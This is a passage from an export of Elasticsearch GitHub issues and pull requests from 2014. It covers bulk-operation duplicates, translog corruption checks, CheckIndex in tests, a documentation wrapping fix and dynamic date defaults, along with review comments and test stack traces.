</description><key id="42882011">7740</key><summary>Internal: Make `TransportMasterNodeOperationAction#checkBlock` abstract</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/kimchy/following{/other_user}', u'events_url': u'https://api.github.com/users/kimchy/events{/privacy}', u'organizations_url': u'https://api.github.com/users/kimchy/orgs', u'url': u'https://api.github.com/users/kimchy', u'gists_url': u'https://api.github.com/users/kimchy/gists{/gist_id}', u'html_url': u'https://github.com/kimchy', u'subscriptions_url': u'https://api.github.com/users/kimchy/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/41300?v=4', u'repos_url': u'https://api.github.com/users/kimchy/repos', u'received_events_url': u'https://api.github.com/users/kimchy/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/kimchy/starred{/owner}{/repo}', u'site_admin': False, u'login': u'kimchy', u'type': u'User', u'id': 41300, u'followers_url': u'https://api.github.com/users/kimchy/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>bug</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T13:34:11Z</created><updated>2014-09-26T12:58:49Z</updated><resolved>2014-09-17T09:31:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>bad text wrapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7739</link><project id="" key="" /><description>On the page http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-synonym-tokenfilter.html

even on a huge monitor the text is being wrapped the next way

```
# If expand==true, "ipod, i-pod, i pod" is equivalent to the explicit
mapping:
ipod, i-pod, i pod =&gt; ipod, i-pod, i pod
# If expand==false, "ipod, i-pod, i pod" is equivalent to the explicit
mapping:
ipod, i-pod, i pod =&gt; ipod
```

So one can think that "mapping:" is not in comment and is a part of syntax. But the lines are less than 80 chars, so perhaps the problem is in the page layout and there may be some other pages in the reference where the text is also being wrapped in an undesirable way.
</description><key id="42881089">7739</key><summary>bad text wrapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">golubev</reporter><labels><label>docs</label></labels><created>2014-09-16T13:24:55Z</created><updated>2014-09-25T17:56:30Z</updated><resolved>2014-09-25T17:44:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T18:59:08Z" id="56720874">Hi @golubev 
Thanks for the PR.  Actually, what I would do is to indent the "ipod" lines by 4 spaces (and put a newline above and below).  Then I'd remove the # characters.

Also, could you sign our CLA so that we can get your changes merged in? 
http://www.elasticsearch.org/contributor-agreement/

thanks
</comment><comment author="golubev" created="2014-09-25T12:50:53Z" id="56813647">Hello, @clintongormley 

I was listed as a contributor, my company - LUN UA LLC - had signed the CCLA.
</comment><comment author="golubev" created="2014-09-25T13:25:11Z" id="56817671">@clintongormley 

You proposed to do it the next way (the word wrap will still have place):

```
# If expand==true, "ipod, i-pod, i pod" is equivalent to the explicit
mapping:

    ipod, i-pod, i pod =&gt; ipod, i-pod, i pod

# If expand==false, "ipod, i-pod, i pod" is equivalent to the explicit
mapping:

    ipod, i-pod, i pod =&gt; ipod
```

Looks better.

Mine variant (only with extra newlines):

```
# If expand==true, "ipod, i-pod, i pod" is equivalent
# to the explicit mapping:

ipod, i-pod, i pod =&gt; ipod, i-pod, i pod

# If expand==false, "ipod, i-pod, i pod" is equivalent
# to the explicit mapping:

ipod, i-pod, i pod =&gt; ipod

```

Perhaps you will not be suprised if I will say that mine variant looks better for me :) To my mind if one see a line that starts not with a hash sign `#` he may think that this line does mean smth. in the file syntax.

But you better know ES code and configs styling, so tell what you think about this.
</comment><comment author="clintongormley" created="2014-09-25T17:44:13Z" id="56855997">Hi @golubev 

After looking at the context of the change (ie within an example file) I agree with you.

Merged, thanks
</comment><comment author="golubev" created="2014-09-25T17:56:30Z" id="56857642">Thanks @clintongormley 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Improve HTTP support in TestClusters</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7738</link><project id="" key="" /><description>This commit disalbes HTTP for all the suite and test scope tests
since it's an unused / unneeded module which takes time to startup.
This also uses a JVM private port range for HTTP ports to ensure
there are no cross JVM conflicts.
</description><key id="42870004">7738</key><summary>[TEST] Improve HTTP support in TestClusters</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T11:14:23Z</created><updated>2015-03-19T16:29:44Z</updated><resolved>2014-09-16T12:32:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-16T11:36:33Z" id="55729851">LGTM thanks @s1monw ! 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Update REST client before each test in our REST tests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7737</link><project id="" key="" /><description>In #7723 we removed the `updateAddresses` method from `RestClient` under the assumption that the addresses never change during the suite execution, as REST tests rely on the global cluster. Due to #6734 we restart the global cluster though before each test if there was a failure in the suite. If that happens we do need to make sure that the REST client points to the proper nodes. What was missing before was the http call to verify the es version every time the addresses change, which we do now since we effectively recreate the REST client from scratch when needed (if the http addresses have changed).
</description><key id="42868119">7737</key><summary>[TEST] Update REST client before each test in our REST tests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T10:49:18Z</created><updated>2014-09-16T14:10:23Z</updated><resolved>2014-09-16T14:10:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-16T11:45:09Z" id="55730713">Pushed a new commit
</comment><comment author="s1monw" created="2014-09-16T12:24:30Z" id="55734284">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that all delete mapping internal requests share the same original headers and context</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7736</link><project id="" key="" /><description>Delete mapping executes flush, delete by query and refresh operations internally. Those internal requests are now initialized by passing in the original delete mapping request so that its headers and request context are kept around.
</description><key id="42865404">7736</key><summary>Make sure that all delete mapping internal requests share the same original headers and context</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T10:16:13Z</created><updated>2015-06-07T10:33:40Z</updated><resolved>2014-09-18T12:09:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-18T10:44:41Z" id="56022504">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Write translog opSize twice</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7735</link><project id="" key="" /><description>Adds a new `greedyRead` method that will read the operation sizes, then
consume that many bytes in the stream, validating the checksum without
transforming the bytes into a `Translog.Operation`. If the bytes are not
corrupt they are read into an operation and returned.

This new `greedyRead` method is used when reading translogs from disk,
where they may have corrupted sizes that can cause OOMEs

Adds a new test with a translog with a corrupted opSize and removes the
`@AwaitsFix` from the testTranslogCorruption in
`AbstractSimpleTranslogTests`.
</description><key id="42862663">7735</key><summary>Write translog opSize twice</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Translog</label><label>blocker</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T09:44:35Z</created><updated>2015-06-07T17:41:06Z</updated><resolved>2014-09-16T13:29:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-09-16T13:29:47Z" id="55741813">Closing this in favor of a bigger change for 1.5 to come.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add indices setter to IndicesRequest interface</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7734</link><project id="" key="" /><description>We currently expose generic getters for `indices` and `indicesOptions` on the `IndicesRequest` interface. This commit adds a generic setter as well, which can be used to set the indices to a request. The setter impl throws `UnsupportedOperationException` if called on internal requests, since it makes sense to eventually replace the indices on external requests only. Also throws exception when the set operation doesn't make sense.
</description><key id="42855886">7734</key><summary>Add indices setter to IndicesRequest interface</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T08:25:53Z</created><updated>2015-06-07T10:35:02Z</updated><resolved>2014-09-18T12:37:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-09-16T09:05:53Z" id="55715405">after thinking about it for a while, I think it'd be better to introduce a sub-interface of the `IndicesRequest`, a la:

``` java
public interface IndicesRequest {

    String[] indices();

    IndicesOptions indicesOptions();

    static Replaceable extends IndicesRequest {

        void indices(String... indices);

    }
}
```

And then for each request choose which one to implement (it'll will avoid all the cases where right now we throw an exception or don't support re-setting the indices)
</comment><comment author="javanna" created="2014-09-16T11:32:49Z" id="55729502">Agreed @uboness I just pushed a couple of new commits to address your feedback
</comment><comment author="uboness" created="2014-09-18T12:18:45Z" id="56030216">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Node join requests should be handled at lower priority than master election</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7733</link><project id="" key="" /><description>When a node is elected as master or receives a join request, we submit a cluster state update task. We should give the node join update task a lower priority than the elect as master to increase the chance it will not be rejected. During master election there is a big chance that these will happen concurrently.

This commit lowers the priority of node joins from IMMEDIATE to URGENT 
</description><key id="42818119">7733</key><summary>Node join requests should be handled at lower priority than master election</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T20:57:03Z</created><updated>2015-06-07T12:02:18Z</updated><resolved>2014-09-16T09:44:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-16T08:58:28Z" id="55714606">LGTM
</comment><comment author="s1monw" created="2014-09-16T08:59:58Z" id="55714775">can we add another priority maybe - maybe `RIGHT_NOW!!` ;)
</comment><comment author="bleskes" created="2014-09-16T09:46:34Z" id="55719872">I  was thinking of YESTERDAY :)  thx @s1monw @martijnvg 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow default (dynamic) time for date mappings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7732</link><project id="" key="" /><description>It would be convenient if the date field could be configured to provide a default time (likely `now()`).  It would make sense if this was an extension to `null_value` which has specific, dynamic functionality for a date field.
</description><key id="42809381">7732</key><summary>Allow default (dynamic) time for date mappings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">polyfractal</reporter><labels><label>:Mapping</label><label>discuss</label><label>enhancement</label></labels><created>2014-09-15T19:28:50Z</created><updated>2016-02-29T20:35:19Z</updated><resolved>2016-02-29T20:35:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-22T11:45:56Z" id="56361622">+1
</comment><comment author="clintongormley" created="2014-09-29T15:25:20Z" id="57177893">it would also remove the need for the dedicated `_timestamp` field
</comment><comment author="colings86" created="2014-09-30T11:18:31Z" id="57298681">So I just had a look at how we might do this and thought of something relating to us doing dynamic null values for any type.

The null_value is obviously used for when there is no supplied value so adding a dynamic value to index is relatively straight forward in this respect. However, the null_value is also used in AbstractFieldMapper.nullValueFilter() to generate a filter for the MissingFilter and here is where the question arises.

We could say that if you set the null_value to be dynamic then the MissingFilter will essentially be a NoOP and not match any documents (since every document with a null value gets a dynamic value added and therefore doesn't have a missing value).

This could cause issues in a system where, for example, you set your null_value to 'NO VALUE' and some of your documents come in with the field set to null and some with the field set to 'NO VALUE' (e.g.  for different systems). At the moment we treat both these as the same in the MissingFilter (they will both have the null_value in the index and will be returned by the MissingFilter. But if we make the null_value dynamic then the 'NO VALUE' fields won't be returned by the filter add won't be dynamically given a value either.  I can see two options to solve this:
- Keep null_value as is and add a new parameter for dynamic value setting with an option to replace anything matching null_value with the dynamic value.
- Require that if you are using a dynamic null_value you ensure that all documents either have a valid value or null (i.e. we will neither replace things like 'NO VALUE' or return them from the MissingFilter)
</comment><comment author="polyfractal" created="2014-10-07T22:29:25Z" id="58273610">Hmm, I agree..it conflates concerns and is confusing.  `null_value` is mainly used when people need to differentiate "explicitly null" from "missing".  Adding a default on top of that could lead to hairy situations as you described.

How about this:
- If configured, `null_value` will replace explicit NULLs with the placeholder
- If configured, `missing_value` will add missing fields to the document using the placeholder

Both `null_value` and `missing_value` can be configured for a static placeholder, or a dynamic value if the type makes sense (e.g. `now()` for dates)

That would allow everyone to specify exactly what they want with no surprises.  The two settings won't interact, since a field is either null or missing.

It does break the case where a field was originally "missing" but made "not missing" by usage of `missing_field`, but I think that will be desired behavior and not a bug, since the user is wanting to replace a missing field with a particular value.
</comment><comment author="clintongormley" created="2014-10-15T16:11:05Z" id="59231494">Another thing to consider - if we generate a value for a date field, should it alter the `_source` to include the generated timestamp?  I think probably not.  In which case the only way it would be retrievable would be to make the field stored.
</comment><comment author="bobbyhubbard" created="2015-12-14T22:57:12Z" id="164586862">With `_timestamp` being deprecated this is a must have moving forward. We have usecases were we can't trust (or more likely dont have) the timestamp of the original document. We want the timestamp when ES last indexed it.

Maybe instead of adding confusion to `null_value`, maybe you could add a new type? For example, a new type called `timestamp` would always default the current timestamp into a stored field outside of the `_source`

This would update the stored field whenever the document is indexed. Another possible usecase might be to insert the timestamp only the FIRST time the document is indexed...which means if its set, dont update it on subsequent updates of the document. No idea how to name that...maybe `timestamp_once`?
</comment><comment author="martijnvg" created="2015-12-15T09:39:44Z" id="164702300">@bobbyhubbard I think the way forward is by using the ingest node (#14049) when it gets available.

Adding a timestamp to a document would look like this:
1) Setup a pipeline with a `set` processor that uses the ingest timestamp:

```
PUT _ingest/pipeline/1
{
  "processors" : [
    {
      "set" : {
        "your_timestamp_field" : "{{_ingest.timestamp}}"
      }
    }
  ]
}
```

2) Make index/bulk requests use this pipeline:

```
PUT /index/type/id?pipeline_id=1
{
...
}
```
</comment><comment author="PhaedrusTheGreek" created="2016-02-05T15:06:11Z" id="180393153">+1
</comment><comment author="clintongormley" created="2016-02-29T20:35:19Z" id="190375667">Closing in favour of #14049
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ClusterHealthAPI does not respect waitForEvents when local flag is set</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7731</link><project id="" key="" /><description>It uses a cluster state update task and it gets rejected if not run on a master node. We should enable running on non-masters if the local flag is set.

Also, report any unexpected error that may happen during this cluster state update task
</description><key id="42802549">7731</key><summary>ClusterHealthAPI does not respect waitForEvents when local flag is set</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T18:19:47Z</created><updated>2015-06-07T18:44:34Z</updated><resolved>2014-09-15T19:05:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-15T18:43:35Z" id="55637310">LGTM except for a minor comment
</comment><comment author="s1monw" created="2014-09-19T10:17:31Z" id="56160136">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: always run CheckIndex after a test, and fail the test if it detects corruption</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7730</link><project id="" key="" /><description>Simple pull request; all tests passed at least once.

The boolean I added is a bit hackity but seems to work; if anyone knows a cleaner way let me know ... (exceptions thrown here are simply caught &amp; logged above).

Tests that create known corrupted shards already seem to set the boolean setting (index.store.mock.check_index_on_close) to false ...
</description><key id="42796199">7730</key><summary>Test: always run CheckIndex after a test, and fail the test if it detects corruption</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>resiliency</label><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T17:16:23Z</created><updated>2014-10-21T21:40:52Z</updated><resolved>2014-09-25T20:48:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-15T17:17:28Z" id="55624508">This is for issue #7724
</comment><comment author="rjernst" created="2014-09-15T17:30:22Z" id="55626361">This looks ok, but just to be clear, this means you could have one test that causes multiple to fail, thinking they had checkindex failures?  Perhaps the message should be more clear that the test printing the failure may not be the one that failed (but it will be one of the tests printing the failure)?

As an alternative, could we store the failure in MockFSDirectoryService, and bubble it up somehow?
</comment><comment author="mikemccand" created="2014-09-15T17:37:31Z" id="55627382">Hmm, I don't think this approach should falsely blame the wrong tests?

Ie, setUp/tearDown are invoked per test method, so I think that should mean that the one test that created the corrupt index, fails, and subsequent tests (who invoke setUp themselves) should not?

But if that's not the case, I agree we should fix it ... I don't want the wrong tests to fail ...
</comment><comment author="rjernst" created="2014-09-15T17:48:46Z" id="55629136">Ok, I see what you are saying now.  I was thinking because it was a static that more than one test could be reading/writing this at once, but within 1 JVM, only 1 test would be invoked at a time, and thus the instance specific setUp/tearDown would handle this..

LGTM.
</comment><comment author="mikemccand" created="2014-09-15T17:49:55Z" id="55629324">Thanks Ryan, I'll push ... we can improve it later.  I think it's really important to get test coverage here in the meantime... if any test "accidentally" creates corrupted indices, we need to know.
</comment><comment author="mikemccand" created="2014-09-15T19:59:43Z" id="55649085">I merged back to master and ran tests but AckTests.testOpenIndexNoAcknowledgement failed:

```
  1&gt; [2014-09-15 15:30:52,896][WARN ][test.store               ] [node_s3] [test][1] check index [failure]
  1&gt; ERROR: could not read any segments file in directory
  1&gt; java.io.EOFException: read past EOF: MMapIndexInput(path="/l/es/target/J2/data/SUITE-haswell-CHILD_VM=[2]-CLUSTER_SEED=[4373530064850319630]-HASH=[CF83DF00FD4DD]/nodes/3/indices/test/1/index/segments_1")
  1&gt;    at org.apache.lucene.store.ByteBufferIndexInput.readByte(ByteBufferIndexInput.java:81)
  1&gt;    at org.apache.lucene.store.MockIndexInputWrapper.readByte(MockIndexInputWrapper.java:122)
  1&gt;    at org.apache.lucene.store.BufferedChecksumIndexInput.readByte(BufferedChecksumIndexInput.java:41)
  1&gt;    at org.apache.lucene.store.DataInput.readInt(DataInput.java:98)
  1&gt;    at org.apache.lucene.index.SegmentInfos.read(SegmentInfos.java:347)
  1&gt;    at org.apache.lucene.index.SegmentInfos$1.doBody(SegmentInfos.java:458)
  1&gt;    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:913)
  1&gt;    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:759)
  1&gt;    at org.apache.lucene.index.SegmentInfos.read(SegmentInfos.java:454)
  1&gt;    at org.apache.lucene.index.CheckIndex.checkIndex(CheckIndex.java:414)
  1&gt;    at org.apache.lucene.index.CheckIndex.checkIndex(CheckIndex.java:393)
  1&gt;    at org.elasticsearch.test.store.MockFSDirectoryService.checkIndex(MockFSDirectoryService.java:103)
  1&gt;    at org.elasticsearch.test.store.MockFSDirectoryService$1.beforeIndexShardClosed(MockFSDirectoryService.java:73)
  1&gt;    at org.elasticsearch.indices.InternalIndicesLifecycle.beforeIndexShardClosed(InternalIndicesLifecycle.java:148)
  1&gt;    at org.elasticsearch.index.service.InternalIndexService.removeShard(InternalIndexService.java:391)
  1&gt;    at org.elasticsearch.index.service.InternalIndexService$1.run(InternalIndexService.java:279)
  1&gt;    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
  1&gt;    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
  1&gt;    at java.lang.Thread.run(Thread.java:745)
```

and also sometimes this:

```
ERROR: could not read any segments file in directory
org.apache.lucene.index.IndexNotFoundException: no segments* file found in store(least_used[ElasticsearchMockDirectoryWrapper(rate_limited(mmapfs(/l/tmp/estests/J0/data/SUITE-haswell-CHILD_VM=[0]-CLUSTER_SEED=[7938606395107563962]-HASH=[CF9B2E6552820]/nodes/2/indices/test/0/index), type=MERGE, rate=20.0))]): files: []
    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:871)
    at org.apache.lucene.index.SegmentInfos$FindSegmentsFile.run(SegmentInfos.java:759)
    at org.apache.lucene.index.SegmentInfos.read(SegmentInfos.java:454)
    at org.apache.lucene.index.CheckIndex.checkIndex(CheckIndex.java:414)
    at org.apache.lucene.index.CheckIndex.checkIndex(CheckIndex.java:393)
    at org.elasticsearch.test.store.MockFSDirectoryService.checkIndex(MockFSDirectoryService.java:103)
    at org.elasticsearch.test.store.MockFSDirectoryService$1.beforeIndexShardClosed(MockFSDirectoryService.java:73)
    at org.elasticsearch.indices.InternalIndicesLifecycle.beforeIndexShardClosed(InternalIndicesLifecycle.java:148)
    at org.elasticsearch.index.service.InternalIndexService.removeShard(InternalIndexService.java:391)
    at org.elasticsearch.index.service.InternalIndexService$1.run(InternalIndexService.java:279)
```

I'm not sure why it fails but ... looking at MockFSDirectoryService, it seems like it runs CheckIndex while IndexWriter is still open on the shard?  Which is in general dangerous since it can lead to false reports like this one ... maybe we need to move the CheckIndex somewhere else?  Not sure what to do here, but if we commit this as is it looks like it may cause many false failures...
</comment><comment author="mikemccand" created="2014-09-24T21:55:33Z" id="56745256">OK I managed to resolve the IndexWriter issue:

I moved MockFSDirectoryService's listener to afterIndexShardClosed:
before isn't safe in general because the IndexWriter is still open.

But that method only received the ShardId, and I didn't know how to
retrieve the Directory from that, so I added IndexShard as an argument
to afterIndexShardClosed (this may be ... strange, but it seems to
work).

Really I would prefer if we could put the wrapping of
MockDirectoryWrapper higher up (over the DistributorDirectory),
instead of inside MockFSDirectoryService; this way, when it's closed,
it would automatically run CheckIndex "at the right time".  But we can
do this later (or maybe there are reasons NOT to do this..); at least
with this change we are getting test coverage looking for any
unexpected corrupt indices created by our tests...

I think it's ready.
</comment><comment author="rmuir" created="2014-09-25T20:39:12Z" id="56880318">&gt; Really I would prefer if we could put the wrapping of
&gt; MockDirectoryWrapper higher up (over the DistributorDirectory),
&gt; instead of inside MockFSDirectoryService; this way, when it's closed,

+1, lets please not let that drop. But we have to start somewhere. This is great for now!
</comment><comment author="mikemccand" created="2014-09-25T20:40:08Z" id="56880438">Thanks Rob, I'll push, and I'll open a new issue to see if we can move the MDW wrapping up higher...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Bulk operation can create duplicates on primary relocation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7729</link><project id="" key="" /><description>When executing a bulk request, with create index operation and auto generate id, if while the primary is relocating the bulk is executed, and the relocation is done while N items from the bulk have executed, the full shard bulk request will be retried on the new primary. This can create duplicates because the request is not makred as potentially holding conflicts.

This change carries over the response for each item on the request level, and if a conflict is detected on the primary shard, and the response is there (indicating that the request was executed once already), use the mentioned response as the actual response for that bulk shard item.

On top of that, when a primary fails and is retried, the change now marks the request as potentially causing duplicates, so the actual impl will do the extra lookup needed.

This change also fixes a bug in our exception handling on the replica, where if a specific item failed, and its not an exception we can ignore, we should actually cause the shard to fail.
</description><key id="42791121">7729</key><summary>Bulk operation can create duplicates on primary relocation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Bulk</label><label>blocker</label><label>bug</label><label>resiliency</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T16:27:57Z</created><updated>2015-06-07T17:54:40Z</updated><resolved>2014-09-16T10:14:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-15T19:07:19Z" id="55642030">Main change looks good to me. There is a typo (s/false/true/) in the BWC commit. I also think we need a BWC test that indexes while relocating . testRecoverFromPreviousVersion looks like a good candidate for a change.
